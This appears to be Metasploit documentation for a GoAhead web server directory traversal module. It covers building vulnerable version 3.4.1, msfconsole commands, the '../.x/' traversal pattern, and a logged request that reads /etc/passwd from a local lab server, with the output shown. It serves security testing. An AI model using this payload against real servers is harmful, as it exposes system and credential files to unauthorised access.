{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/http/goahead_traversal","result":{"data":{"moduleMetadataJson":{"id":"3caf9701-b04b-5298-86b4-e0f40d8b3eda","name":"Embedthis GoAhead Embedded Web Server Directory Traversal","fullname":"auxiliary/scanner/http/goahead_traversal","description":"This module exploits a directory traversal vulnerability in the Embedthis\n        GoAhead Web Server v3.4.1, allowing an attacker to read arbitrary files\n        with the web server privileges.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/http/goahead_traversal","documentationSlug":"/modules/documentation/auxiliary/scanner/http/goahead_traversal","referencesSlug":"/modules/references/auxiliary/scanner/http/goahead_traversal"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>GoAhead web server by EmbedThis versions from 3.0.0 through 3.4.1 contains a directory traversal vulnerability.\nTo exploit this vulnerability, each <code class=\"language-text\">../</code> must be matched with a <code class=\"language-text\">.x/</code>, with each being grouped together.\nFor instance a depth of 2 will look as follows: <code class=\"language-text\">../../.x/.x/foobar</code>.</p>\n<p>An excellent writeup is available on <a href=\"https://packetstormsecurity.com/files/131156/GoAhead-3.4.1-Heap-Overflow-Traversal.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PacketStorm</a>.</p>\n<h3 id=\"install-on-kali\" style=\"position:relative;\"><a href=\"#install-on-kali\" aria-label=\"install on kali permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install on Kali</h3>\n<p>Since <code class=\"language-text\">goahead</code> is available on Git, we can simply download the vulnerable version, compile, and run it.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@kali:/tmp# wget https://github.com/embedthis/goahead/archive/v3.4.1.tar.gz\n--2019-10-07 20:42:28--  https://github.com/embedthis/goahead/archive/v3.4.1.tar.gz\nResolving github.com (github.com)... 192.30.253.113\nConnecting to github.com (github.com)|192.30.253.113|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLocation: https://codeload.github.com/embedthis/goahead/tar.gz/v3.4.1 [following]\n--2019-10-07 20:42:29--  https://codeload.github.com/embedthis/goahead/tar.gz/v3.4.1\nResolving codeload.github.com (codeload.github.com)... 192.30.253.120\nConnecting to codeload.github.com (codeload.github.com)|192.30.253.120|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [application/x-gzip]\nSaving to: ‘v3.4.1.tar.gz’\n\nv3.4.1.tar.gz                                   [     &lt;=&gt;                                                                                 ]   5.95M  6.35MB/s    in 0.9s    \n\n2019-10-07 20:42:30 (6.35 MB/s) - ‘v3.4.1.tar.gz’ saved [6234594]\n\nroot@kali:/tmp# tar -zxf v3.4.1.tar.gz \nroot@kali:/tmp# cd goahead-3.4.1/\nroot@kali:/tmp/goahead-3.4.1# make\nmake --no-print-directory -f projects/goahead-linux-default.mk all\n      [Info] Use make SHOW=1 to trace executed commands.\n      [Copy] build/linux-x64-default/bin/ca.crt\n      [Copy] build/linux-x64-default/inc/osdep.h\n      [Copy] build/linux-x64-default/inc/est.h\n   [Compile] build/linux-x64-default/obj/estLib.o\n      [Link] build/linux-x64-default/bin/libest.so\n      [Copy] build/linux-x64-default/inc/goahead.h\n      [Copy] build/linux-x64-default/inc/js.h\n   [Compile] build/linux-x64-default/obj/action.o\n   [Compile] build/linux-x64-default/obj/alloc.o\n   [Compile] build/linux-x64-default/obj/auth.o\n   [Compile] build/linux-x64-default/obj/cgi.o\n   [Compile] build/linux-x64-default/obj/crypt.o\n   [Compile] build/linux-x64-default/obj/file.o\n   [Compile] build/linux-x64-default/obj/fs.o\n   [Compile] build/linux-x64-default/obj/http.o\n   [Compile] build/linux-x64-default/obj/js.o\n   [Compile] build/linux-x64-default/obj/jst.o\n   [Compile] build/linux-x64-default/obj/options.o\n   [Compile] build/linux-x64-default/obj/osdep.o\n   [Compile] build/linux-x64-default/obj/rom-documents.o\n   [Compile] build/linux-x64-default/obj/route.o\n   [Compile] build/linux-x64-default/obj/runtime.o\n   [Compile] build/linux-x64-default/obj/socket.o\n   [Compile] build/linux-x64-default/obj/upload.o\n   [Compile] build/linux-x64-default/obj/est.o\n   [Compile] build/linux-x64-default/obj/matrixssl.o\n   [Compile] build/linux-x64-default/obj/nanossl.o\n   [Compile] build/linux-x64-default/obj/openssl.o\n      [Link] build/linux-x64-default/bin/libgo.so\n   [Compile] build/linux-x64-default/obj/goahead.o\n      [Link] build/linux-x64-default/bin/goahead\n   [Compile] build/linux-x64-default/obj/test.o\n      [Link] build/linux-x64-default/bin/goahead-test\n   [Compile] build/linux-x64-default/obj/gopass.o\n      [Link] build/linux-x64-default/bin/gopass\n\nYou can now install via &quot;sudo make  install&quot; or run GoAhead via: &quot;sudo make run&quot;\nTo run locally, put linux-x64-default/bin in your path\n\nroot@kali:/tmp/goahead-3.4.1# build/linux-x64-default/bin/goahead --verbose --home test /var/www/html/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/http/goahead_traversal</code></li>\n<li>Do: <code class=\"language-text\">set rhosts [ip]</code></li>\n<li>Do: <code class=\"language-text\">set depth [number]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get the file contents.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>DEPTH</strong></p>\n<p>  The depth to traverse from the webroot.  This does not need to be exact, overshooting (using a number larger than needed)\nwill still result in the file being obtained.  Default is <code class=\"language-text\">5</code></p>\n<p>  <strong>FILEPATH</strong></p>\n<p>  The path to the file to read.  Default is <code class=\"language-text\">/etc/passwd</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"goahead-341-on-kali\" style=\"position:relative;\"><a href=\"#goahead-341-on-kali\" aria-label=\"goahead 341 on kali permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GoAhead 3.4.1 on Kali</h3>\n<p>Install from the instructions at the top of this document.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/scanner/http/goahead_traversal \nmsf5 auxiliary(scanner/http/goahead_traversal) &gt; set rhosts 127.0.0.1\nrhosts =&gt; 127.0.0.1\nmsf5 auxiliary(scanner/http/goahead_traversal) &gt; set depth 5\ndepth =&gt; 5\nmsf5 auxiliary(scanner/http/goahead_traversal) &gt; run\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n\n[+] File saved in: /root/.msf4/loot/20191007213309_default_127.0.0.1_goahead.traversa_324804.txt\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"server-logs\" style=\"position:relative;\"><a href=\"#server-logs\" aria-label=\"server logs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Logs</h4>\n<p>When setting the server to verbose output, the following is shown during exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># build/linux-x64-default/bin/goahead --verbose --home test /var/www/html/\ngoahead: 2: Configuration for Embedthis GoAhead\ngoahead: 2: ---------------------------------------------\ngoahead: 2: Version:            3.4.1\ngoahead: 2: BuildType:          Debug\ngoahead: 2: CPU:                x64\ngoahead: 2: OS:                 linux\ngoahead: 2: Host:               127.0.1.1\ngoahead: 2: Directory:          /var/www/html/goahead-3.4.1/test\ngoahead: 2: Documents:          /var/www/html/\ngoahead: 2: Configure:          me -d -q -platform linux-x86-default -configure . -with est -gen make\ngoahead: 2: ---------------------------------------------\ngoahead: 2: Started http://*:80\ngoahead: 2: Started https://*:443\ngoahead: 2: GET ../../../../../.x/.x/.x/.x/.x/etc/passwd HTTP/1.1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3caf9701-b04b-5298-86b4-e0f40d8b3eda"}}}